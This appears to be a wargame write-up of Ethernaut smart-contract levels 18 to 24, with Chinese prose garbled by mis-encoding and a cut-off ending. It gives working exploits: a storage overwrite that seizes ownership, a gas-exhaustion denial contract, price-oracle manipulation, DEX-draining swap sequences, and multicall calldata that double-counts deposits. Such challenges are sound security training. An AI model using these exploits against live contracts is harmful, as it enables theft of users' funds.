<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-vi-the-swarm-hash-70f069e22aef</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404242022619.jpeg?size=medium"
alt="åˆçº¦åˆ›å»ºçš„è¿‡ç¨‹" />
<figcaption aria-hidden="true">åˆçº¦åˆ›å»ºçš„è¿‡ç¨‹</figcaption>
</figure>
<p>ä»£ç åˆ†ä¸ºä¸¤éƒ¨åˆ†</p>
<ul>
<li>initialization code</li>
<li>runtime code</li>
</ul>
<p>å…·ä½“è®²è§£çœ‹æ–‡ç« å°±è¡Œ</p>
<p>runtime code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x2a ; store 42 in memory</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20 ; return the memory address of 42</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>è½¬æˆhexæ­£å¥½10bytes<code>602a60805260206080f3</code></p>
<p>æ ¹æ®ä¸Šé¢å‡ ç¯‡æ–‡ç« é‡Œä»‹ç»çš„åŸç†, ç¼–å†™ runtime code
çš„æ—¶å€™å…¶å®æ— éœ€è€ƒè™‘å…·ä½“çš„æ–¹æ³•åæ˜¯ä»€ä¹ˆ (whatIsTheMeaningOfLife)</p>
<p>å› ä¸º EVM æ‰§è¡Œå­—èŠ‚ç æ—¶æ°¸è¿œéƒ½æ˜¯ä»ä¸Šè‡³ä¸‹æ‰§è¡Œ,
è€Œæ­£å¸¸åˆçº¦å­—èŠ‚ç çš„å¼€å¤´ä¼šæ ¹æ® calldata å†… selector çš„å€¼ JUMPI
åˆ°ç‰¹å®šçš„ä½ç½®, ä»¥æ­¤å®ç°ä¸åŒæ–¹æ³•çš„è°ƒç”¨ (è·¯ç”±)</p>
<p>å¯¹äºè¿™é¢˜æ¥è¯´, åªéœ€è¦è¿”å› 42 å°±è¡Œ (RETURN), ä¹Ÿå°±æ— éœ€åŠ å…¥é’ˆå¯¹ selector
çš„åˆ¤æ–­</p>
<p>initialization code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x0a ; copy runtime code to memory</span><br><span class="line">PUSH1 0x0c</span><br><span class="line">PUSH1 0x00</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x0a ; return the memory address of code</span><br><span class="line">PUSH1 0x00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>è½¬ä¸ºhex<code>600a600c600039600a6000f3</code></p>
<p>æœ€ç»ˆ hex, å‰ 12 bytes ä¸º initialization code, å 10 bytes ä¸º runtime
code</p>
<p><code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// deploy contract</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// å³é”®å›æ˜¾ï¼Œå¤åˆ¶object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;blockHash&quot;</span>: <span class="string">&quot;0x63eb03c9313eb08f9634a66cf4f6dc29cf8f00447c3881e39c743e9c06af19a5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;blockNumber&quot;</span>: <span class="number">6390825</span>,</span><br><span class="line">    <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x71e6E63B138806572D11A60A8778FfA154ab96c5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cumulativeGasUsed&quot;</span>: <span class="number">1517854</span>,</span><br><span class="line">    <span class="string">&quot;effectiveGasPrice&quot;</span>: <span class="number">13186593185</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>: <span class="string">&quot;0x9a80a78bebe92ef9cdfc4ca116fc4925237fdbd0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gasUsed&quot;</span>: <span class="number">55354</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;logsBloom&quot;</span>: <span class="string">&quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&quot;transactionHash&quot;</span>: <span class="string">&quot;0xa33ade6dd8c074ed59d0db434b3e7768944240707d1a4a9a61e8bb28f99d55f6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transactionIndex&quot;</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setSolver æ³¨æ„è¿™é‡Œçš„åœ°å€å¾—æ˜¯sendTransactionå›æ˜¾çš„åˆçº¦åœ°å€</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0x2132C7bc11De7A90B87375f282d36100a29f97a9&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="alien-codex">19 Alien Codex</h2>
<p>åšè¿™é“é¢˜ä¹‹å‰å…ˆé˜…è¯»<a
href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018">è¿™ç¯‡</a>ï¼Œè¯»åˆ°åŠ¨æ€æ•°ç»„çš„å­˜å‚¨æ–¹å¼</p>
<p>å¦å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥æŸ¥çœ‹ codex å­˜æ”¾çš„çœŸå® slot åœ°å€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–ï¼Œä¸€ä¸ªåˆçº¦ä¸­å­˜åœ¨ 2^256 ä¸ª slot æ§½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œslot[2^256 - 1] å°±æ˜¯
slot çš„æœ€åä¸€ä¸ª 32bytes é•¿çš„å…ƒç´ ã€‚åŒæ—¶ï¼Œæœ¬é¢˜ revise
å‡½æ•°è™½ç„¶åœ¨ä¿®æ”¹ä¸‹æ ‡å¤§äº length çš„è¶Šç•Œå˜é‡æ—¶ä¼šæŠ¥é”™ï¼Œä½† retract
å‡½æ•°å¹¶æ²¡æœ‰å¯¹å®¹é‡åšæ£€æŸ¥ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¾ˆè½»æ¾åœ°å°±å¯ä»¥é€šè¿‡ retract å‡½æ•°å°†
codex çš„ length å‡ä¸º 2^256-1ï¼Œè¿›è€Œä¿®æ”¹é€šè¿‡ revise(i,'evilcontent') å°†
slot ä¸­ä»»æ„ä¸€ä¸ªä½ç½®ä¿®æ”¹ä¸º 'evilcontent'ã€‚</p>
<p>åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°† slot[0] ä¸­çš„ owner
æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±é’±åŒ…çš„åœ°å€ã€‚å› æ­¤ï¼Œæ€è·¯å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>makeContact</li>
<li>é€šè¿‡ retract å‡½æ•°å°† length å‡ä¸º 2^256 - 1</li>
<li>æ­¤æ—¶ä½¿ç”¨ keccak256(abi.encodePacked(uint256(1))) è®¡ç®—å‡ºå­˜æ”¾ codex
çš„æ’æ§½çš„ slot åœ°å€<code>array_addr</code></li>
<li>å› ä¸º array_addr è·ç¦» slot[0] è¿˜æœ‰ diff = (2^256 - 1) - array_addr +
1 è¿™ä¹ˆå¤šï¼›è€Œ codex[0] æ­£å¥½æ˜¯ slot[array_addr]ã€‚</li>
<li>å› æ­¤ï¼Œslot[0] = codex[0 + diff]ï¼Œexpå¦‚ä¸‹</li>
</ol>
<p>æœ‰äº† slot[0] çš„ä½ç½®ï¼Œè€Œä¸”æˆ‘ä»¬ç°åœ¨ä¹Ÿå·²ç»çŸ¥é“ contact åœ¨ slot[0]
ä¸­ï¼Œcodex çš„é•¿åº¦ç‹¬å  slot[1]ã€‚è€Œæ ¹æ®<a
href="https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there">è¿™ç¯‡</a>æ–‡ç« ï¼Œ<a
href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol">Ownable-05</a>
ä¸­çš„ owner åœ°å€å˜é‡å­˜æ”¾åœ¨ AlienCodex åˆçº¦å˜é‡çš„ä¸Šæ–¹ï¼Œä¹Ÿå°±æ˜¯
slot[0]ï¼Œä»ä»£ç è§’åº¦çœ‹ï¼Œå¯ä»¥ç†è§£ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address private _owner;</span><br><span class="line">bool public contact;</span><br><span class="line">bytes32[] public codex;</span><br></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°† slot[0] ä¿®æ”¹ä¸º 0x..001&lt;address&gt;ã€‚exp
å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li><p>await contract.makeContact()</p></li>
<li><p>await contract.retract()</p></li>
<li><p>æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°éƒ¨ç½²ä»¥ä¸‹åˆçº¦ï¼Œå¹¶è°ƒç”¨getSlotForArrayElement(0)ï¼Œè¿™é‡Œæœ¬åœ°å›æ˜¾çš„<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>è¿™ä¸ªåœ°å€è·Ÿè¿œç¨‹å­˜å‚¨
codex çš„ slot åœ°å€ä¸€æ¨¡ä¸€æ ·</p></li>
<li><p>è®¡ç®— diff = 2^256 -
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6ï¼Œå¾—åˆ°diff
=
0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30aï¼Œå³35707666377435648211887908874984608119992236509074197713628505308453184860938</p></li>
<li><p>await
contract.revise(diff,'0x0000000000000000000000019a80a78bebE92EF9cDfC4CA116fC4925237fDbd0')</p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="denial">20 Denial</h2>
<p>æ¡ä»¶: åœ¨ owner è°ƒç”¨ withdraw æ—¶æ‹’ç»æå–èµ„é‡‘ (åˆçº¦ä»æœ‰èµ„é‡‘, å¹¶ä¸”äº¤æ˜“çš„
gas å°‘äº 1M)</p>
<p>å…¶å®å°±æ˜¯åœ¨ receive/fallback é‡Œå†™ä¸€ä¸ªæ­»å¾ªç¯å°† gas è€—å°½, è¿™æ ·åç»­è°ƒç”¨
transfer è½¬è´¦çš„æ—¶å€™å°±ä¼š revert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    uint256 counter = 0;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            counter ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setWithdrawPartner</span>(<span class="string">&#x27;0x&quot;evil_contract_addr&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="shop">21 Shop</h2>
<p>æœ¬é¢˜é’ˆå¯¹ view å‡½æ•°çš„ç¼ºé™·è¿›è¡Œäº†æ”»å‡»ï¼Œè·Ÿ Elevator
é‚£é¢˜çš„æ€è·¯å¾ˆåƒï¼Œéƒ½æ˜¯åœ¨ victim åˆçº¦åœ¨è°ƒç”¨å¤–éƒ¨ evil
åˆçº¦å‡½æ•°æ—¶ï¼Œè‡ªèº«çŠ¶æ€å˜é‡çš„æ›´æ–°å‰æ²¡æœ‰åˆç†çº¦æŸæ¡ä»¶å¯¼è‡´çš„ï¼Œæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li><p>å½“ MyBuyer åˆçº¦è°ƒç”¨ shop.buy() æ—¶ï¼ŒShop åˆçº¦ä¼šè°ƒç”¨ MyBuyer çš„
price å‡½æ•°ã€‚</p></li>
<li><p>åœ¨ price å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œshop.isSold() ä»ç„¶æ˜¯ falseï¼Œå› æ­¤è¿”å›
101ã€‚</p></li>
<li><p>Shop åˆçº¦æ£€æŸ¥ price è¿”å›çš„å€¼ä¸º 101ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œäºæ˜¯è®¾ç½® isSold ä¸º
trueï¼Œå¹¶æ›´æ–° price ä¸º 101ã€‚</p></li>
<li><p>ç„¶å Shop å†æ¬¡è°ƒç”¨ price å‡½æ•°ä¸ºçŠ¶æ€å˜é‡ price èµ‹å€¼ï¼Œæ­¤æ—¶
shop.isSold() å·²ç»æ˜¯ trueï¼Œæ‰€ä»¥è¿”å› 99ã€‚å› ä¸º isSold å·²ç»æ›´æ–°ä¸º
trueï¼ŒShop åˆçº¦ä¸ä¼šå†æ¬¡è¿›è¡Œæ£€æŸ¥æˆ–æ›´æ–°ã€‚</p></li>
</ol>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// contract Shop ç²˜è´´è¿‡æ¥</span><br><span class="line"></span><br><span class="line">contract MyBuyer is Buyer &#123;</span><br><span class="line">    Shop shop;</span><br><span class="line"></span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        shop = Shop(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 101;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="dex">22 Dex</h2>
<p>è¿™é“é¢˜èƒŒåè€ƒå¯Ÿçš„æ˜¯ dex
çš„åŸç†ï¼Œä½†ç”±äºæµ®ç‚¹æ•°å¤„ç†å¼‚å¸¸ï¼Œæ¯æ¬¡äº¤æ¢æ—¶ç”¨æˆ·å¸Œæœ›äº¤æ¢çš„æ•°ç›®å¯èƒ½å°äºå®é™…äº¤æ¢çš„æ•°ç›®ï¼Œå› æ­¤æ¥å›å€’å‡ ç¬”é’±ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤šæ‹¿åˆ°æœ¬æ¥ä¸å±äºæˆ‘ä»¬çš„é’±ï¼ˆï¼Ÿ</p>
<p>dex çš„åŸºæœ¬åŸç†æ˜¯å°†ä¸€å¯¹ä»£å¸åŠ å…¥æµåŠ¨æ± ä»¥æä¾›æµåŠ¨æ€§,
è¿™æ ·å°±å¯ä»¥å®ç°ä¸¤ç§ä»£å¸ä¹‹é—´çš„äº¤æ¢,
äº¤æ¢çš„ä»·æ ¼æ˜¯æ ¹æ®æµåŠ¨æ± å†…ä»£å¸çš„æ¯”ä¾‹åŠ¨æ€è®¡ç®—çš„</p>
<p>å¯¹äºè¿™é“é¢˜æ¥è¯´, æµåŠ¨æ± å†…ä¸€å¯¹ä»£å¸ X å’Œ Y
ä¹‹é—´çš„æ±‡ç‡ä¸è¿™ä¸¤ç§ä»£å¸åœ¨æµåŠ¨æ± å†…çš„æ€»é‡æˆåæ¯”</p>
<p>æ¯”å¦‚æ± å­é‡Œæœ‰ 100 X å’Œ 10 Y, é‚£ä¹ˆæ±‡ç‡å°±æ˜¯ 1 Y = 10 X</p>
<p>å¦‚æœæµåŠ¨æ± å†…ä»£å¸ X çš„æ€»é‡å¢å¤§, é‚£ä¹ˆ X ç›¸å¯¹äº Y åœ¨è´¬å€¼, å³æ¯ä¸ª X
èƒ½å…‘æ¢çš„ Y ä¼šå˜å°‘</p>
<p>ç›¸å, å¦‚æœ X çš„æ€»é‡å‡å°‘, é‚£ä¹ˆ X ç›¸å¯¹äº Y åœ¨å‡å€¼, å³æ¯ä¸ª X èƒ½å…‘æ¢çš„ Y
ä¼šå˜å¤š</p>
<p>é¢˜ç›®ä¸èƒ½å¤Ÿæ‰‹åŠ¨ä¿®æ”¹ token1 æˆ– token2 çš„åœ°å€</p>
<p>ç„¶åè™½ç„¶ addLiquidity å‡½æ•°è¢«é™åˆ¶äº† onlyOwner,
ä½†å®é™…ä¸Šä»ç„¶å¯ä»¥é€šè¿‡æ‰‹åŠ¨è°ƒç”¨ token1/token2 åˆçº¦çš„æ–¹å¼æ¥å¼ºåˆ¶æ·»åŠ æµåŠ¨æ€§,
ä¸è¿‡è¿™ä¸ªç‚¹å…·ä½“æ€ä¹ˆåˆ©ç”¨ç›®å‰è¿˜æ²¡æ€ä¹ˆæƒ³åˆ°</p>
<p>getSwapPrice ç”¨äºåŠ¨æ€è®¡ç®—ç”¨ä»£å¸ from å…‘æ¢ to æ—¶çš„ä»·æ ¼ï¼Œä½† Solidity
æ²¡æœ‰æµ®ç‚¹æ•°, æ•´æ•°ä¹‹é—´ç›¸é™¤å¾—åˆ°çš„ç»“æœä¼šè¢«å»æ•´, å³ä¸¢æ‰åé¢çš„å°æ•°ä½æ•°ã€‚</p>
<p>å½“ç”¨æˆ·åœ¨ token1 å’Œ token2 ä¹‹é—´æ¥å›å…‘æ¢æ—¶,
å¯ä»¥çœ‹åˆ°æ¯æ¬¡èƒ½æ‹¿åˆ°çš„ä»£å¸æ•°é‡å…¶å®æ˜¯åœ¨å˜å¤šçš„, è¿™æ ·å¤šå€’å‡ æ¬¡æœ€ç»ˆå°±èƒ½å°† dex
æ± å†…æŸä¸€ç±»å‹çš„ä»£å¸æ¬ç©º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let token1 = await contract.token1();</span><br><span class="line">let token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">await contract.approve(instance, 1000);</span><br><span class="line"></span><br><span class="line">await contract.swap(token1, token2, 10);</span><br><span class="line">await contract.swap(token2, token1, 20);</span><br><span class="line">await contract.swap(token1, token2, 24);</span><br><span class="line">await contract.swap(token2, token1, 30);</span><br><span class="line">await contract.swap(token1, token2, 41);</span><br><span class="line"></span><br><span class="line">// swap with 45 token2 because 65 * 110 / 45 = 158 &gt; 110 and 46 * 110 / 45 = 110</span><br><span class="line">await contract.swap(token2, token1, 45);</span><br><span class="line"></span><br><span class="line">// should return 0</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br></pre></td></tr></table></figure>
<h2 id="dex-two">23 DEX TWO</h2>
<p>è¿™é¢˜ä¸ Dex çš„åŒºåˆ«åœ¨äº swap å‡½æ•°æ²¡æœ‰äº†å¯¹ from å’Œ to ä»£å¸åœ°å€çš„é™åˆ¶,
è¿™è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è‡ªå·±å‘è¡Œçš„ä»£å¸ä¸ dex å†…çš„ token1/token2 äº¤æ¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token3 is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;Token3&quot;, &quot;Token3&quot;) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address account, uint256 value) external &#123;</span><br><span class="line">        _mint(account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address account, uint256 value) external &#123;</span><br><span class="line">        _burn(account, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> token1 = <span class="keyword">await</span> contract.<span class="title function_">token1</span>();</span><br><span class="line"><span class="keyword">let</span> token2 = <span class="keyword">await</span> contract.<span class="title function_">token2</span>();</span><br><span class="line"><span class="keyword">let</span> token3 = <span class="string">&#x27;Token Contract Addr&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.mint(player, 2);</span></span><br><span class="line"><span class="comment">// token3.mint(instance, 1);</span></span><br><span class="line"><span class="comment">// token3.approve(instance, 1000);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// approve token1 and token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token1</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token1, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token1 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token1, instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.burn(instane, 1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token2 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token2, instance)).<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// è¿™é‡Œä¼šå‘ç° token2 å¹¶ä¸æ˜¯ 0ï¼Œè€Œæ˜¯ 50ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬çŒè¿›å»çš„ token3 è´¬å€¼äº†</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨æ›´å¤šçš„ token3 æŠŠ token2 æ¢å‡ºæ¥</span></span><br><span class="line"><span class="comment">// æˆ‘å½“æ—¶æ²¡ç®—å¥½ï¼Œæ‰€ä»¥ swap(token2,token3,3) ä¹‹ååˆ swap(token2,token3,7)</span></span><br><span class="line"><span class="comment">// æ€»å…±æ˜¯ç”¨æˆ‘çš„ 10 ä¸ª token2 æ¢äº† instance çš„ 0 ä¸ª token3 å‡ºæ¥</span></span><br><span class="line"><span class="comment">// ç”¨ä¸‹é¢è¿™è¡Œåº”è¯¥ä¹Ÿèƒ½è¾¾æ ‡</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token3, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// è¿™æ · instance é‡Œ token2 : token3 = 60 : 3 = 20 : 1</span></span><br><span class="line"><span class="comment">// æˆ‘ä»¬åªéœ€è¦ç”¨ 3 ä¸ª token3 å°±å¯ä»¥æ¢å‡º instance é‡Œ å‰©ä¸‹çš„ 60 ä¸ª token2 äº†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -&gt; remix é‡Œ token3.mint(player, 3);</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>åšå®Œè¿™é“é¢˜æˆ‘æ‰ç†è§£ä»£å¸åˆ°åº•æ˜¯å¹²å•¥çš„...æ¯”å¦‚è¯´æœ‰å¾ˆå€¼é’±çš„ token1 ä¸
token2ï¼Œåœ¨ dex äº¤æ¢æ—¶æ²¡æœ‰æ£€æµ‹å¥½å¸ç±»ï¼Œè®©éæ³•å¸æ··å…¥äº†æ± é‡Œï¼Œtoken1/2 å°±ä¼šè¢«
token3 å¤§é‡æ›¿ä»£</p>
<p>åŒæ ·ï¼Œå¦‚æœæ²¡æœ‰åšå¥½æµ®ç‚¹æ•°çº¦æŸï¼Œä¹Ÿä¼šé€ æˆèµ„é‡‘çš„æŸå¤±..</p>
<p>é“¾å­è¿˜æ˜¯è›®æœ‰æ„æ€çš„ :D</p>
<h2 id="puzzle-wallet">24 Puzzle Wallet</h2>
<p>è¿™ä»£ç å¥½é•¿..è¿™ä¹‹åçš„é¢˜åšçš„éƒ½æ‡µæ‡µçš„ï¼Œä¹‹åå¯¹åˆçº¦æœ‰ä¸€å®šçš„äº†è§£ä¹‹åå†å›è¿‡å¤´æ¥çœ‹å§ã€‚</p>
<p>exp:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// invoke PuzzleProxy.proposeNewAdmin() to change `owner` in PuzzleWallet</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&#x27;a63767460000000000000000000000009a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// add player to whitelist</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">addToWhitelist</span>(player);</span><br><span class="line"></span><br><span class="line"><span class="comment">// multicall calldata</span></span><br><span class="line"><span class="keyword">let</span> multicall = <span class="string">&#x27;ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke multicall x2, and each multicall will invoke deposit</span></span><br><span class="line"><span class="comment">// msg.value will be used twice (add 0.002 eth), but we only need to send it once (0.001 eth)</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: multicall, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of player, should be 0.002 eth</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// transfer contract balance to player</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">execute</span>(player, <span class="title function_">toWei</span>(<span class="string">&#x27;0.002&#x27;</span>), <span 